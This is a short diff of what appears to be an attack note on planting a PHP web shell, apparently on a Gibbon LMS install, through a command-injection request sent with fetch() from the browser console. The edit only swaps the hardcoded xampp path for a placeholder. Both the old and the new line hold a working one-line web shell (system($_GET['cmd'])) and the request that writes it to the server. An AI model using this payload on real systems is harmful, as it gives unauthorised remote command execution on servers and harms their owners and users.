@@ -1,6 +1,6 @@
 ##Upload Php shell with js from browser console:
 fetch("http://url?cmd=" + encodeURIComponent(
-    `echo "<?php system($_GET['cmd']); ?>" > C:\\xampp\\htdocs\\Gibbon-LMS\\shell.php`
+    `echo "<?php system($_GET['cmd']); ?>" > TargetsSystemPath`
 ))
 
 ---------------------------------------------------------------------------------------------------------------------------
